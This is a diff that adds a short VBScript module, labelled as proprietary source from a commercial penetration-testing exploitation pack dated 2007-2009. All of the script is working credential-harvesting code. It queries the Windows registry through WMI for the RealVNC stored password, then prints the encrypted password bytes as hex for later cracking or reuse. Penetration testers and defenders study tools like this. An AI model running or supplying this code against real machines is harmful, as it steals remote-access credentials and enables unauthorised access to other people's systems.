@@ -1,0 +1,19 @@
+'
+' Proprietary D2 Exploitation Pack source code - use only under the license
+' agreement specified in LICENSE.txt in your D2 Exploitation Pack
+'
+' Copyright DSquare Security, LLC, 2007-2009
+'
+
+const HKEY_LOCAL_MACHINE = &H80000002
+
+strComputer  = "."
+strKeyPath   = "SOFTWARE\RealVNC\WinVNC4"
+strValueName = "Password"
+
+Set objReg = GetObject("winmgmts:" _
+     & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv" )
+
+objReg.GetBinaryValue HKEY_LOCAL_MACHINE, strKeyPath, strValueName, arrValues
+
+Wscript.echo "[D2] VNC Password Hash : " & Hex(arrValues(0)) & " " & Hex(arrValues(1)) & " " & Hex(arrValues(2)) & " " & Hex(arrValues(3)) & " " & Hex(arrValues(4)) & " " & Hex(arrValues(5)) & " " & Hex(arrValues(6)) & " " & Hex(arrValues(7))
